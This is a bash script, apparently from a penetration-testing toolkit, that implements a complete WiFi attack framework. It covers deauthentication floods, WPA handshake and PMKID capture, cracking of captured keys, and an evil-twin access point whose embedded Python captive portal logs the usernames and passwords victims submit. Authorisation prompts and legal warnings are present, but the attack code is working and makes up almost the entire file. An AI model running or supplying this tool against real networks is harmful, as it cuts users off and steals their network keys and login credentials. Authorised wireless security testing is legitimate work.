#!/usr/bin/env bash
# =============================================================================
# wifi_arsenal.sh - guided WiFi attack framework
# =============================================================================
#
# Description
# -----------
# Menu-driven wrapper around the aircrack-ng suite (plus hcxdumptool/hcxtools
# for PMKID, hostapd+dnsmasq for evil twin, and hashcat/aircrack-ng for
# cracking). Every destructive action requires explicit confirmation, every
# capture is stored with a timestamp and hashed into the chain-of-custody log,
# and the session is written to the shared event feed.
#
# Capabilities
#   1  Reconnaissance        - enable monitor mode, survey the airspace
#   2  Handshake capture     - targeted deauth + WPA/WPA2 4-way handshake
#   3  PMKID capture         - clientless attack with hcxdumptool
#   4  Deauthentication      - single or broadcast deauth (disruptive!)
#   5  Evil twin / captive portal - clone an SSID and harvest credentials
#   6  Crack captures        - aircrack-ng or hashcat with wordlists
#   7  Convert/cleanup       - hcxpcapngtool conversion, monitor mode off
#   8  Signal strength       - live proximity estimate for a BSSID
#
# Author      : cyberdeck-arsenal contributors
# Version     : 1.0.0
# Dependencies: aircrack-ng suite, hcxdumptool/hcxtools, iw, hashcat (optional),
#               hostapd + dnsmasq (evil twin), cyberdeck_common.sh
# Licence     : MIT - AUTHORISED TARGETS ONLY. Deauthentication and evil twin
#               attacks are intrusive and illegal without written authorisation
#               (UK Computer Misuse Act 1990 s.1-3, radio licensing rules).
#
# Usage
# -----
#   sudo ./wifi_arsenal.sh                 # interactive menu
#   sudo ./wifi_arsenal.sh --scan          # non-interactive survey
#   sudo ./wifi_arsenal.sh --handshake wlan0mon AA:BB:CC:DD:EE:FF 6
#   sudo ./wifi_arsenal.sh --crack captures/wifi/handshake.cap
#   ./wifi_arsenal.sh --help
# =============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [[ -f "${SCRIPT_DIR}/../lib/cyberdeck_common.sh" ]]; then
    source "${SCRIPT_DIR}/../lib/cyberdeck_common.sh"
elif [[ -f /opt/cyberdeck-arsenal/lib/cyberdeck_common.sh ]]; then
    source /opt/cyberdeck-arsenal/lib/cyberdeck_common.sh
else
    echo "fatal: cyberdeck_common.sh not found" >&2
    exit 1
fi

cdeck::init "wifi_arsenal"

CAPTURE_DIR="$(cdeck::conf_get general.install_dir /opt/cyberdeck-arsenal)/captures/wifi"
WORDLIST="$(cdeck::conf_get general.install_dir /opt/cyberdeck-arsenal)/data/wordlists/rockyou.txt"
[[ -f "${WORDLIST}" ]] || WORDLIST="/usr/share/wordlists/rockyou.txt"
RUN_DIR=""
MON_IFACE=""
STATE_FILE=""

# --------------------------------------------------------------------------- #
# Help
# --------------------------------------------------------------------------- #
usage() {
    cdeck::usage_header \
        "WiFi attack framework (aircrack-ng + hcxdumptool + hostapd)" \
        "$0 [--scan | --handshake <iface> <bssid> <channel> | --pmkid <iface> | --crack <file> | --menu]" \
        "sudo $0                     # interactive menu" \
        "sudo $0 --scan              # survey the airspace" \
        "sudo $0 --handshake wlan0mon AA:BB:CC:DD:EE:FF 6" \
        "sudo $0 --crack captures/wifi/handshake.cap" \
        "sudo $0 --evil-twin wlan0mon 'Free WiFi' 6"
    cat <<EOF

${C_BOLD}LEGAL${C_RESET}
  ${C_RED}Deauthentication, evil twin and handshake capture are intrusions.${C_RESET}
  Use only on networks you own or have written authorisation to test. The
  operator is solely responsible for compliance with the Computer Misuse Act,
  radio regulations and any other applicable law.

${C_BOLD}OPTIONS${C_RESET}
  --menu                 interactive menu (default)
  --scan                 enable monitor mode and list nearby networks
  --handshake IF BSSID CH   capture a WPA handshake (deauth + capture)
  --pmkid IF             clientless PMKID capture
  --deauth IF BSSID CH [COUNT]  deauth frames (disruptive, explicit confirm)
  --evil-twin IF SSID CH  clone an SSID with a captive portal
  --crack FILE           crack a capture with aircrack-ng/hashcat
  --cleanup              stop monitor mode and restore the interface
  --help, -h             this help
EOF
}

# --------------------------------------------------------------------------- #
# Prerequisites and setup
# --------------------------------------------------------------------------- #
check_tools() {
    local missing=()
    for tool in iw airodump-ng aireplay-ng airmon-ng aircrack-ng; do
        cdeck::has_cmd "${tool}" || missing+=("${tool}")
    done
    if (( ${#missing[@]} )); then
        cdeck::error "missing tools: ${missing[*]}"
        cdeck::info "install with: sudo pacman -S aircrack-ng"
        return 1
    fi
    cdeck::has_cmd hcxdumptool || cdeck::warn "hcxdumptool not installed - PMKID capture unavailable"
    cdeck::has_cmd hashcat || cdeck::warn "hashcat not installed - cracking will use aircrack-ng only"
    return 0
}

pick_interface() {
    # Choose a monitor-capable interface from the configuration or hardware
    local configured candidate
    configured="$(cdeck::conf_get network.monitor_interface "")"
    if [[ -n "${configured}" && -d "/sys/class/net/${configured}" ]]; then
        printf '%s' "${configured}"; return 0
    fi
    while read -r candidate; do
        [[ -z "${candidate}" ]] && continue
        printf '%s' "${candidate}"; return 0
    done < <(cdeck::monitor_capable_interfaces)
    # Fall back to any wireless interface
    while read -r candidate; do
        [[ -z "${candidate}" ]] && continue
        printf '%s' "${candidate}"; return 0
    done < <(cdeck::wlan_interfaces)
    return 1
}

enable_monitor() {
    local iface="$1"
    if [[ "${iface}" == *mon* ]]; then
        MON_IFACE="${iface}"
        cdeck::ok "${iface} already looks like a monitor interface"
        return 0
    fi
    cdeck::info "putting ${iface} into monitor mode"
    # airmon-ng check kill would break the operator's own connectivity: warn only
    if cdeck::has_cmd airmon-ng; then
        local interfering
        interfering="$(airmon-ng check 2>/dev/null | awk '/^[0-9]+/ {print $2}' | tr '\n' ' ')"
        [[ -n "${interfering}" ]] && cdeck::warn "processes that may interfere: ${interfering}"
        airmon-ng start "${iface}" >/dev/null 2>&1 || true
        while read -r candidate; do
            if [[ "${candidate}" == *mon* ]]; then
                MON_IFACE="${candidate}"
                cdeck::ok "monitor interface: ${MON_IFACE}"
                return 0
            fi
        done < <(cdeck::wlan_interfaces)
    fi
    ip link set "${iface}" down 2>/dev/null || true
    iw "${iface}" set type monitor >/dev/null 2>&1 || {
        cdeck::error "could not enable monitor mode on ${iface}"
        cdeck::info "check the adapter: cdeck hardware"
        return 1
    }
    ip link set "${iface}" up 2>/dev/null || true
    MON_IFACE="${iface}"
    cdeck::ok "monitor interface: ${MON_IFACE}"
    return 0
}

disable_monitor() {
    local monitor="${1:-${MON_IFACE}}"
    [[ -z "${monitor}" ]] && { cdeck::warn "no monitor interface recorded"; return 0; }
    cdeck::info "restoring ${monitor} to managed mode"
    if cdeck::has_cmd airmon-ng; then
        airmon-ng stop "${monitor}" >/dev/null 2>&1 || true
    fi
    local base="${monitor%mon}"
    if [[ -d "/sys/class/net/${base}" ]]; then
        ip link set "${base}" down 2>/dev/null || true
        iw "${base}" set type managed >/dev/null 2>&1 || true
        ip link set "${base}" up 2>/dev/null || true
        cdeck::ok "${base} restored to managed mode"
    fi
    if cdeck::has_cmd systemctl; then
        systemctl restart NetworkManager >/dev/null 2>&1 \
            && cdeck::ok "NetworkManager restarted" || true
    fi
    return 0
}

setup_run_dir() {
    local stamp; stamp="$(cdeck::stamp)"
    RUN_DIR="${CAPTURE_DIR}/${stamp}"
    mkdir -p "${RUN_DIR}"
    chmod 0700 "${RUN_DIR}"
    STATE_FILE="${RUN_DIR}/session.txt"
    {
        printf 'session_started=%s\n' "$(date -Is)"
        printf 'operator=%s\n' "$(cdeck::conf_get general.operator_name operator)"
        printf 'host=%s\n' "$(hostname)"
    } > "${STATE_FILE}"
    cdeck::ok "capture directory: ${RUN_DIR}"
}

hash_captures() {
    # Hash everything captured in this session into the custody log
    local hasher
    for hasher in "${SCRIPT_DIR}/../recon/reporting/evidence_hasher.py" \
                  /opt/cyberdeck-arsenal/recon/reporting/evidence_hasher.py; do
        if [[ -f "${hasher}" ]]; then
            cdeck::info "hashing captures into the chain-of-custody log"
            python3 "${hasher}" "${RUN_DIR}" --note "wifi_arsenal session $(date -Is)" \
                >/dev/null 2>&1 && cdeck::ok "captures hashed" \
                || cdeck::warn "hashing failed - run: cdeck hash ${RUN_DIR}"
            return 0
        fi
    done
    cdeck::warn "evidence_hasher.py not found - captures were not hashed"
}

log_event() {
    # log_event <message> [severity]
    local message="$1" severity="${2:-INFO}"
    python3 - "$message" "${severity}" <<'PYEOF' 2>/dev/null || true
import sys
try:
    sys.path.insert(0, "/opt/cyberdeck-arsenal/lib")
    from cyberlib import Database
    with Database("events") as db:
        db.event("wifi_arsenal", "wireless", sys.argv[1], sys.argv[2])
except Exception:
    pass
PYEOF
}

# --------------------------------------------------------------------------- #
# 1. Reconnaissance
# --------------------------------------------------------------------------- #
do_scan() {
    local iface="${1:-$(pick_interface)}"
    [[ -z "${iface}" ]] && { cdeck::error "no wireless interface available"; return 1; }
    cdeck::require_root "monitor mode" || return 1
    enable_monitor "${iface}" || return 1

    setup_run_dir
    cdeck::banner "airspace survey" "${MON_IFACE} · 20 seconds"
    cdeck::warn "this passive survey listens only: no frames are transmitted"

    local scan_base="${RUN_DIR}/survey"
    timeout 25 airodump-ng --output-format csv,pcap --write "${scan_base}" "${MON_IFACE}" \
        >/dev/null 2>&1 || cdeck::warn "airodump-ng returned early"

    local csv_file="${scan_base}-01.csv"
    if [[ ! -f "${csv_file}" ]]; then
        cdeck::error "no survey output produced - is ${MON_IFACE} actually in monitor mode?"
        return 1
    fi

    # Parse the CSV: access points first, then clients
    python3 - "${csv_file}" <<'PYEOF'
import csv, sys
rows = list(csv.reader(open(sys.argv[1], errors="replace")))
aps, clients, mode = [], [], "ap"
for row in rows:
    if not row:
        continue
    if row[0].startswith("BSSID"):
        mode = "ap"; continue
    if row[0].startswith("Station MAC"):
        mode = "client"; continue
    if mode == "ap" and len(row) > 13 and ":" in row[0]:
        aps.append({"bssid": row[0].strip(), "channel": row[3].strip(),
                    "privacy": row[5].strip(), "power": row[8].strip(),
                    "essid": row[13].strip()})
    elif mode == "client" and len(row) > 5:
        clients.append({"mac": row[0].strip(), "power": row[3].strip(),
                        "bssid": row[5].strip()})
print(f"\n  {len(aps)} access point(s), {len(clients)} client(s) observed\n")
print(f"  {'BSSID':<19}{'CH':<4}{'PWR':>5}  {'ENC':<12}ESSID")
for ap in sorted(aps, key=lambda a: a["power"] or "0", reverse=True):
    if not ap["bssid"]:
        continue
    enc = ap["privacy"] or "OPEN"
    print(f"  {ap['bssid']:<19}{ap['channel']:<4}{ap['power']:>5}  {enc:<12}{ap['essid'] or '<hidden>'}")
opn = [a for a in aps if (a["privacy"] or "").strip() in ("", "OPN")]
if opn:
    print(f"\n  ! {len(opn)} open network(s): {', '.join(a['essid'] or a['bssid'] for a in opn[:6])}")
wep = [a for a in aps if "WEP" in (a["privacy"] or "").upper()]
if wep:
    print(f"  ! {len(wep)} WEP network(s) - trivially crackable, report as critical")
PYEOF

    cdeck::ok "survey saved to ${RUN_DIR}"
    hash_captures
    log_event "airspace survey completed on ${MON_IFACE}" INFO
    return 0
}

# --------------------------------------------------------------------------- #
# 2. Handshake capture
# --------------------------------------------------------------------------- #
do_handshake() {
    local iface="$1" bssid="$2" channel="$3" client="${4:-}"
    [[ -z "${iface}" || -z "${bssid}" || -z "${channel}" ]] && {
        cdeck::error "usage: --handshake <iface> <bssid> <channel> [client-mac]"; return 2; }
    cdeck::require_root "handshake capture" || return 1
    cdeck::legal_warning "deauthentication of clients on ${bssid}"
    cdeck::warn "this will disconnect real users for a short period"
    cdeck::confirm "Confirm you are authorised to attack ${bssid}?" n || {
        cdeck::error "not authorised - aborting"; return 1; }

    enable_monitor "${iface}" || return 1
    setup_run_dir
    local base="${RUN_DIR}/handshake_${bssid//:/}"

    cdeck::info "locking ${MON_IFACE} to channel ${channel} and capturing"
    iw dev "${MON_IFACE}" set channel "${channel}" 2>/dev/null || true

    airodump-ng --bssid "${bssid}" --channel "${channel}" --write "${base}" \
        --output-format pcap,csv "${MON_IFACE}" >/dev/null 2>&1 &
    local airodump_pid=$!
    sleep 6

    # Try a targeted deauth if we know a client, otherwise a short broadcast burst
    local attempts=0
    while (( attempts < 5 )); do
        attempts=$(( attempts + 1 ))
        if [[ -n "${client}" ]]; then
            cdeck::info "deauth attempt ${attempts}: client ${client}"
            aireplay-ng --deauth 3 -a "${bssid}" -c "${client}" "${MON_IFACE}" >/dev/null 2>&1 || true
        else
            cdeck::info "deauth attempt ${attempts}: broadcast (2 frames, minimal disruption)"
            aireplay-ng --deauth 2 -a "${bssid}" "${MON_IFACE}" >/dev/null 2>&1 || true
        fi
        sleep 6
        # Check for a handshake in the capture
        if aircrack-ng "${base}"-01.cap 2>/dev/null | grep -q "1 handshake"; then
            cdeck::ok "WPA handshake captured (attempt ${attempts})"
            break
        fi
    done

    sleep 2
    kill -TERM "${airodump_pid}" 2>/dev/null || true
    sleep 1

    local cap_file="${base}-01.cap"
    if [[ -f "${cap_file}" ]] && aircrack-ng "${cap_file}" 2>/dev/null | grep -q "1 handshake"; then
        cdeck::ok "capture confirmed: ${cap_file}"
        cdeck::info "crack it with: $0 --crack ${cap_file}"
    else
        cdeck::warn "no handshake confirmed in ${cap_file:-the capture}"
        cdeck::info "tips: get closer, target a client, or capture longer (PMKID often works better)"
    fi

    # Convert for hashcat and keep the hash lines for reporting
    if cdeck::has_cmd hcxpcapngtool && [[ -f "${cap_file}" ]]; then
        hcxpcapngtool -o "${RUN_DIR}/hashes.22000" -E "${RUN_DIR}/essids.txt" "${cap_file}" \
            >/dev/null 2>&1 && cdeck::ok "hashcat 22000 format written" || true
    fi

    hash_captures
    log_event "handshake capture attempted against ${bssid}" ALERT
    return 0
}

# --------------------------------------------------------------------------- #
# 3. PMKID capture
# --------------------------------------------------------------------------- #
do_pmkid() {
    local iface="$1" bssid="${2:-}"
    cdeck::require_root "PMKID capture" || return 1
    if ! cdeck::has_cmd hcxdumptool; then
        cdeck::error "hcxdumptool is not installed (sudo pacman -S hcxdumptool)"
        return 1
    fi
    cdeck::legal_warning "active PMKID capture"
    cdeck::confirm "Confirm you are authorised to test the target network?" n || return 1

    enable_monitor "${iface}" || return 1
    setup_run_dir
    cdeck::banner "PMKID capture" "clientless attack · 60 seconds"
    cdeck::info "this solicits PMKID responses from access points - no clients required"

    # Revert the monitor interface to a form hcxdumptool accepts, then run
    ip link set "${MON_IFACE}" down 2>/dev/null || true
    local iface_arg=("-i" "${MON_IFACE}")
    [[ -n "${bssid}" ]] && iface_arg+=(--filterlist_ap="${bssid}" --filtermode=2)

    timeout 70 hcxdumptool "${iface_arg[@]}" -o "${RUN_DIR}/pmkid.pcapng" \
        --enable_status=2 > "${RUN_DIR}/pmkid.log" 2>&1 || true
    ip link set "${MON_IFACE}" up 2>/dev/null || true

    if [[ -s "${RUN_DIR}/pmkid.pcapng" ]] && cdeck::has_cmd hcxpcapngtool; then
        hcxpcapngtool -o "${RUN_DIR}/pmkid.22000" "${RUN_DIR}/pmkid.pcapng" >/dev/null 2>&1 || true
        if [[ -s "${RUN_DIR}/pmkid.22000" ]]; then
            local count; count="$(grep -c 'WPA\*' "${RUN_DIR}/pmkid.22000" 2>/dev/null || echo 0)"
            cdeck::ok "PMKID hash captured (${count} line(s))"
            cdeck::info "crack with: hashcat -m 22000 ${RUN_DIR}/pmkid.22000 ${WORDLIST}"
        else
            cdeck::warn "no PMKID recovered - the AP may not support it (try the handshake method)"
        fi
    else
        cdeck::warn "no capture produced - check ${RUN_DIR}/pmkid.log"
    fi
    hash_captures
    log_event "PMKID capture attempted" ALERT
    return 0
}

# --------------------------------------------------------------------------- #
# 4. Deauthentication
# --------------------------------------------------------------------------- #
do_deauth() {
    local iface="$1" bssid="$2" channel="$3" count="${4:-5}" client="${5:-}"
    cdeck::require_root "deauthentication" || return 1
    [[ -z "${iface}" || -z "${bssid}" ]] && { cdeck::error "usage: --deauth <iface> <bssid> [channel] [count] [client]"; return 2; }

    cdeck::banner "DEAUTHENTICATION" "${bssid}"
    cdeck::alert "this is a denial-of-service attack against real users"
    cdeck::warn "it is unlawful against networks you do not own, even 'just to test'"
    cdeck::confirm "Type y to confirm you own or are authorised to test ${bssid}" n || {
        cdeck::error "aborted"; return 1; }

    enable_monitor "${iface}" || return 1
    [[ -n "${channel}" ]] && iw dev "${MON_IFACE}" set channel "${channel}" 2>/dev/null || true
    setup_run_dir

    if [[ -n "${client}" ]]; then
        aireplay-ng --deauth "${count}" -a "${bssid}" -c "${client}" "${MON_IFACE}" \
            2>&1 | tee "${RUN_DIR}/deauth.log"
    else
        aireplay-ng --deauth "${count}" -a "${bssid}" "${MON_IFACE}" \
            2>&1 | tee "${RUN_DIR}/deauth.log"
    fi
    cdeck::ok "deauth frames sent (count=${count})"
    log_event "deauthentication frames sent to ${bssid}" ALERT
    return 0
}

# --------------------------------------------------------------------------- #
# 5. Evil twin / captive portal
# --------------------------------------------------------------------------- #
do_evil_twin() {
    local iface="$1" ssid="$2" channel="$3"
    cdeck::require_root "evil twin" || return 1
    [[ -z "${iface}" || -z "${ssid}" ]] && { cdeck::error "usage: --evil-twin <iface> <ssid> <channel>"; return 2; }

    if ! cdeck::has_cmd hostapd || ! cdeck::has_cmd dnsmasq; then
        cdeck::error "hostapd and dnsmasq are required for the evil twin (pacman -S hostapd dnsmasq)"
        return 1
    fi

    cdeck::banner "EVIL TWIN / CAPTIVE PORTAL" "${ssid}"
    cdeck::alert "this impersonates a network to capture credentials"
    cdeck::warn "use only in a written, scoped engagement with a signed authorisation"
    cdeck::confirm "Confirm you have written authorisation for this test?" n || {
        cdeck::error "aborted"; return 1; }

    enable_monitor "${iface}" || return 1
    setup_run_dir

    # The AP itself runs on a second interface if one is available
    local ap_iface="${MON_IFACE%mon}"
    [[ -d "/sys/class/net/${ap_iface}" ]] || ap_iface="${MON_IFACE}"

    # hostapd configuration for an open network with the cloned SSID
    cat > "${RUN_DIR}/hostapd.conf" <<EOF
# cyberdeck-arsenal evil twin - generated $(date -Is)
interface=${ap_iface}
driver=nl80211
ssid=${ssid}
hw_mode=g
channel=${channel:-6}
ieee80211n=1
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
EOF

    # dnsmasq: DHCP plus a wildcard DNS response pointing everything at us
    cat > "${RUN_DIR}/dnsmasq.conf" <<EOF
# cyberdeck-arsenal captive portal DNS/DHCP
interface=${ap_iface}
dhcp-range=10.20.30.10,10.20.30.200,12h
dhcp-option=3,10.20.30.1
dhcp-option=6,10.20.30.1
address=/#/10.20.30.1
log-queries
log-dhcp
EOF

    # Minimal captive portal that logs every submitted credential
    mkdir -p "${RUN_DIR}/portal"
    cat > "${RUN_DIR}/portal/index.html" <<EOF
<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>${ssid} - sign in</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
 body{font-family:system-ui,sans-serif;background:#0e1116;color:#d7e3ee;margin:0;
      display:flex;align-items:center;justify-content:center;height:100vh}
 .card{background:#151b23;padding:28px 32px;border-radius:12px;width:320px;border:1px solid #263042}
 h1{font-size:1.2rem;margin:0 0 4px} p{color:#7d8b99;font-size:.9rem}
 input{width:100%;padding:10px;margin:6px 0;border-radius:6px;border:1px solid #263042;
       background:#0b0f14;color:#d7e3ee}
 button{width:100%;padding:11px;margin-top:10px;border:0;border-radius:6px;background:#00ffd5;
        color:#0e1116;font-weight:700;cursor:pointer}
</style></head><body><div class="card">
<h1>${ssid}</h1><p>Sign in to continue to the internet.</p>
<form method="POST" action="/login">
 <input name="username" placeholder="Email or username" autocomplete="off" required>
 <input name="password" type="password" placeholder="Password" required>
 <button type="submit">Connect</button>
</form></div></body></html>
EOF

    cat > "${RUN_DIR}/portal_server.py" <<'EOF'
"""Captive portal used by wifi_arsenal.sh - logs submitted credentials."""
import json, sys, time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

CAPTURE = sys.argv[1] if len(sys.argv) > 1 else "captured_credentials.jsonl"

class Handler(BaseHTTPRequestHandler):
    def _page(self):
        try:
            with open("index.html", "rb") as handle:
                return handle.read()
        except OSError:
            return b"<h1>Login required</h1>"

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(self._page())))
        self.end_headers()
        self.wfile.write(self._page())

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")
        fields = {k: v[0] for k, v in parse_qs(body).items()}
        record = {"ts": time.strftime("%Y-%m-%dT%H:%M:%S"), "client": self.client_address[0],
                  "path": self.path, **fields}
        with open(CAPTURE, "a") as handle:
            handle.write(json.dumps(record) + "\n")
        sys.stderr.write(f"captured credentials from {self.client_address[0]}\n")
        self.send_response(302)
        self.send_header("Location", "http://connectivity-check.internet/")
        self.end_headers()

    def log_message(self, *_args):
        pass

HTTPServer(("10.20.30.1", 80), Handler).serve_forever()
EOF

    # Bring up the fake AP
    ip addr add 10.20.30.1/24 dev "${ap_iface}" 2>/dev/null || true
    ip link set "${ap_iface}" up 2>/dev/null || true
    sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1 || true

    hostapd "${RUN_DIR}/hostapd.conf" > "${RUN_DIR}/hostapd.log" 2>&1 &
    local hostapd_pid=$!
    sleep 3
    dnsmasq --conf-file="${RUN_DIR}/dnsmasq.conf" > "${RUN_DIR}/dnsmasq.log" 2>&1 &
    local dnsmasq_pid=$!
    ( cd "${RUN_DIR}/portal" && python3 "${RUN_DIR}/portal_server.py" \
        "${RUN_DIR}/captured_credentials.jsonl" ) > "${RUN_DIR}/portal.log" 2>&1 &
    local portal_pid=$!

    cdeck::ok "fake AP '${ssid}' is live on ${ap_iface}"
    cdeck::info "portal: http://10.20.30.1/  credentials log: ${RUN_DIR}/captured_credentials.jsonl"
    cdeck::warn "press Ctrl-C to stop the attack and release the interface"

    # shellcheck disable=SC2064 - deliberate early expansion of the interface name
    trap "kill -TERM ${hostapd_pid} ${dnsmasq_pid} ${portal_pid} 2>/dev/null || true; \
          ip addr del 10.20.30.1/24 dev ${ap_iface} 2>/dev/null || true; \
          cdeck::info 'evil twin stopped'; hash_captures; exit 0" INT TERM
    while kill -0 "${hostapd_pid}" 2>/dev/null; do
        sleep 5
        if [[ -f "${RUN_DIR}/captured_credentials.jsonl" ]]; then
            local count; count="$(wc -l < "${RUN_DIR}/captured_credentials.jsonl")"
            (( count > 0 )) && cdeck::alert "${count} credential set(s) captured so far"
        fi
    done
    return 0
}

# --------------------------------------------------------------------------- #
# 6. Cracking
# --------------------------------------------------------------------------- #
do_crack() {
    local capture="$1" wordlist="${2:-${WORDLIST}}"
    [[ -z "${capture}" ]] && { cdeck::error "usage: --crack <capture-file> [wordlist]"; return 2; }
    if [[ ! -f "${capture}" ]]; then
        # Maybe it was produced by hcx tools
        local alt="${capture%.cap}.22000"
        if [[ -f "${alt}" ]]; then capture="${alt}"; else
            cdeck::error "capture file not found: ${capture}"; return 2
        fi
    fi
    if [[ ! -f "${wordlist}" ]]; then
        cdeck::warn "wordlist not found: ${wordlist}"
        cdeck::info "download one with: cdeck update   (or pass a path)"
        return 2
    fi

    cdeck::banner "cracking" "$(basename "${capture}") · $(basename "${wordlist}")"
    local size candidate_count
    size="$(du -h "${wordlist}" | cut -f1)"
    candidate_count="$(wc -l < "${wordlist}" 2>/dev/null || echo '?')"
    cdeck::info "wordlist size: ${size} (${candidate_count} candidates)"

    if [[ "${capture}" == *.22000 ]] && cdeck::has_cmd hashcat; then
        cdeck::info "hashcat mode 22000 (PMKID + handshake)"
        hashcat -m 22000 "${capture}" "${wordlist}" --force --status --status-timer=15 \
            2>&1 | tee "${capture%.22000}.hashcat.log"
        local cracked="${capture%.22000}-cracked.22000"
        if [[ -f "${cracked}" ]]; then
            cdeck::alert "KEY RECOVERED:"
            cat "${cracked}"
        else
            cdeck::warn "no key recovered with this wordlist"
        fi
    else
        cdeck::info "aircrack-ng with the supplied wordlist"
        aircrack-ng -w "${wordlist}" -b "${BSSID:-}" "${capture}" 2>&1 \
            | tee "${capture%.cap}.aircrack.log"
        if grep -q "KEY FOUND" "${capture%.cap}.aircrack.log" 2>/dev/null; then
            cdeck::alert "KEY RECOVERED - see ${capture%.cap}.aircrack.log"
        else
            cdeck::warn "no key recovered with this wordlist"
        fi
    fi
    return 0
}

# --------------------------------------------------------------------------- #
# 7. Cleanup, 8. Signal strength
# --------------------------------------------------------------------------- #
do_cleanup() {
    cdeck::banner "cleanup" "restoring interfaces and stopping interference"
    cdeck::kill_processes "airodump-ng" "aireplay-ng" "hcxdumptool" "hostapd" "dnsmasq" \
        "portal_server.py" || true
    local iface
    for iface in $(cdeck::interfaces); do
        [[ "${iface}" == *mon ]] && disable_monitor "${iface}"
    done
    chmod -R go-rwx "${CAPTURE_DIR}" 2>/dev/null || true
    cdeck::ok "cleanup complete"
    if [[ -n "${RUN_DIR}" ]]; then
        hash_captures
        cdeck::info "session data: ${RUN_DIR}"
    fi
    return 0
}

do_signal() {
    local iface="$1" bssid="$2"
    [[ -z "${iface}" || -z "${bssid}" ]] && { cdeck::error "usage: --signal <iface> <bssid>"; return 2; }
    cdeck::require_root "signal measurement" || return 1
    enable_monitor "${iface}" || return 1
    cdeck::banner "proximity estimate" "${bssid} (Ctrl-C to stop)"
    while true; do
        local reading
        reading="$(iw dev "${MON_IFACE}" station dump 2>/dev/null | awk -v b="${bssid}" \
            '$0 ~ b {found=1} found && /signal:/ {print $2; exit}')"
        if [[ -z "${reading}" ]]; then
            reading="$(timeout 5 airodump-ng --bssid "${bssid}" "${MON_IFACE}" 2>/dev/null \
                | awk -v b="${bssid}" -F, '$1 ~ b {gsub(/ /,"",$9); print $9; exit}')"
        fi
        if [[ -n "${reading}" ]]; then
            local estimate="far (20m+)"
            (( reading > -50 )) && estimate="very close (<2m)"
            (( reading > -60 && reading <= -50 )) && estimate="close (2-5m)"
            (( reading > -70 && reading <= -60 )) && estimate="nearby (5-20m)"
            printf '\r  signal %s dBm  %-20s' "${reading}" "${estimate}"
        else
            printf '\r  searching for %s...          ' "${bssid}"
        fi
        sleep 2
    done
}

# --------------------------------------------------------------------------- #
# Interactive menu
# --------------------------------------------------------------------------- #
menu() {
    while true; do
        printf '\n'
        cdeck::banner "WIFI ARSENAL" "$(date '+%H:%M:%S') · monitor: ${MON_IFACE:-none}"
        cat <<EOF

  ${C_BOLD}1${C_RESET}) Airspace survey (passive, safe)
  ${C_BOLD}2${C_RESET}) Capture WPA handshake (${C_RED}deauth - disruptive${C_RESET})
  ${C_BOLD}3${C_RESET}) PMKID capture (clientless)
  ${C_BOLD}4${C_RESET}) Deauthenticate a client (${C_RED}denial of service${C_RESET})
  ${C_BOLD}5${C_RESET}) Evil twin + captive portal (${C_RED}credential capture${C_RESET})
  ${C_BOLD}6${C_RESET}) Crack a capture (aircrack-ng / hashcat)
  ${C_BOLD}7${C_RESET}) Signal strength / proximity estimate
  ${C_BOLD}8${C_RESET}) Show captures and session state
  ${C_BOLD}9${C_RESET}) Cleanup (stop everything, restore interfaces)
  ${C_BOLD}0${C_RESET}) Quit

${C_DIM}  All attack actions require authorisation confirmation.${C_RESET}
EOF
        local choice
        read -r -p "  select> " choice || return 0
        case "${choice}" in
            1) do_scan ;;
            2)
                local iface bssid channel
                read -r -p "  monitor interface [${MON_IFACE:-auto}]: " iface
                read -r -p "  target BSSID: " bssid
                read -r -p "  channel: " channel
                do_handshake "${iface:-$(pick_interface)}" "${bssid}" "${channel}"
                ;;
            3)
                local iface bssid
                read -r -p "  monitor interface [${MON_IFACE:-auto}]: " iface
                read -r -p "  target BSSID (blank = all): " bssid
                do_pmkid "${iface:-$(pick_interface)}" "${bssid}"
                ;;
            4)
                local iface bssid channel count
                read -r -p "  monitor interface [${MON_IFACE:-auto}]: " iface
                read -r -p "  target BSSID: " bssid
                read -r -p "  channel: " channel
                read -r -p "  frame count [10]: " count
                do_deauth "${iface:-$(pick_interface)}" "${bssid}" "${channel}" "${count:-10}"
                ;;
            5)
                local iface ssid channel
                read -r -p "  interface [${MON_IFACE:-auto}]: " iface
                read -r -p "  SSID to clone: " ssid
                read -r -p "  channel [6]: " channel
                do_evil_twin "${iface:-$(pick_interface)}" "${ssid}" "${channel:-6}"
                ;;
            6)
                local capture
                read -r -p "  capture file: " capture
                do_crack "${capture}"
                ;;
            7)
                local iface bssid
                read -r -p "  monitor interface [${MON_IFACE:-auto}]: " iface
                read -r -p "  target BSSID: " bssid
                do_signal "${iface:-$(pick_interface)}" "${bssid}"
                ;;
            8)
                printf '\n  capture root: %s\n' "${CAPTURE_DIR}"
                find "${CAPTURE_DIR}" -maxdepth 2 -type f -printf '    %p (%s bytes)\n' 2>/dev/null \
                    | head -30 || printf '    (nothing captured yet)\n'
                printf '\n'
                ;;
            9) do_cleanup ;;
            0|q|quit|exit) cdeck::info "exiting the arsenal"; return 0 ;;
            *) cdeck::warn "unknown selection: ${choice}" ;;
        esac
    done
}

# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
main() {
    # --help and --version must work without root
    case "${1:-}" in
        --help|-h) usage; exit 0 ;;
        --version|-V) printf 'wifi_arsenal %s\n' "${CDECK_VERSION}"; exit 0 ;;
    esac

    cdeck::require_root || exit 1
    check_tools || exit 1
    mkdir -p "${CAPTURE_DIR}"
    chmod 0700 "${CAPTURE_DIR}"

    if ! cdeck::require_acknowledgement; then
        exit 1
    fi

    case "${1:-}" in
        --help|-h)     usage; exit 0 ;;
        --scan)        do_scan "${2:-}" ;;
        --handshake)   shift; do_handshake "$@" ;;
        --pmkid)       shift; do_pmkid "$@" ;;
        --deauth)      shift; do_deauth "$@" ;;
        --evil-twin)   shift; do_evil_twin "$@" ;;
        --crack)       shift; do_crack "$@" ;;
        --signal)      shift; do_signal "$@" ;;
        --cleanup)     do_cleanup ;;
        "")            menu ;;
        *)             cdeck::error "unknown option: $1"; usage; exit 2 ;;
    esac
    exit $?
}

main "$@"
